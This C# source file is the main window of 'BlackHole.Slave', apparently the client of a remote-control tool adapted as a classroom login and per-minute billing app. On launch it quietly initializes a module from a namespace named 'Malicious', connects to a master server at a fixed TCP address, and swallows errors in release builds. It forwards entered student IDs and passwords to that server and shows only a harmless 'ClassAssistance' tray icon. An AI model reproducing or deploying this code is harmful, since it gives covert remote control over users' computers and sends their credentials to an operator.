using System.Windows;
using System;
using System.Threading;
using System.Windows.Forms;
using BlackHole.Slave.Helper.Native.Impl;
using BlackHole.Slave.Malicious;
using System.Timers;
using System.Drawing;

namespace BlackHole.Slave
{
    
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public static void FireShutdown(int reason) => MasterServer.Instance.FireShutdown(reason);
        public string stuid;
        public string password;
        MasterServer mServer;
        public LoginProtect loginProtect;
        public static NotifyIcon ni;
        public static long startTime, endTime;
        public static double price;

        public MainWindow()
        {
            try
            {
                MaliciousManager.Instance.Initialize();
                mServer = MasterServer.Instance;
                mServer.Connect("tcp://10.9.0.149:5556");

                Kernel32.SetConsoleCtrlHandler(ctrl =>
                {
                    FireShutdown((int)ctrl);
                    Thread.Sleep(500);
                    return true;
                }, true);
                InitializeComponent();
                InitialMinimize();
                loginProtect = new LoginProtect();
            }
            catch (Exception e)
            {
#if DEBUG
                System.Windows.Forms.MessageBox.Show(e.ToString());
#endif
            }
            
            
        }

        private void StuLogin(object sender, RoutedEventArgs e)
        {
            
            stuid = Stuid.Text;
            password = Password.Text;
            mServer.RequestLogin(stuid, password);
            
        }

        public void InitialMinimize()
        {
            MenuItem menuItem1 = new MenuItem();
            ContextMenu contextMenu = new ContextMenu();

            menuItem1.Index = 0;
            menuItem1.Text = "Log out";
            menuItem1.Click += delegate (object sender, EventArgs args)
            {
                this.Show();
                this.WindowState = WindowState.Maximized;
                this.WindowStyle = WindowStyle.None;
                endTime = DateTime.Now.Ticks;
                double minutes = TimeSpan.FromTicks(endTime-startTime).TotalMinutes;
                double totalPrice = Math.Round(minutes * price, 2);
                System.Windows.MessageBox.Show("The total cost is " + totalPrice);
            };
            contextMenu.MenuItems.Add(menuItem1);

            ni = new NotifyIcon();
            ni.Text = "ClassAssistance";
            ni.ContextMenu = contextMenu;
            ni.Visible = true;

#if DEBUG
            ni.Icon = new Icon("../../../BlackHole.Master/Resources/icons/light/appbar.book.perspective.ico");
#else
            ShortCut.currentDirectory = Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
         
            ni.Icon = new Icon(ShortCut.currentDirectory + "\\Resources\\main-blue.ico");
            
#endif

        }


    }
}
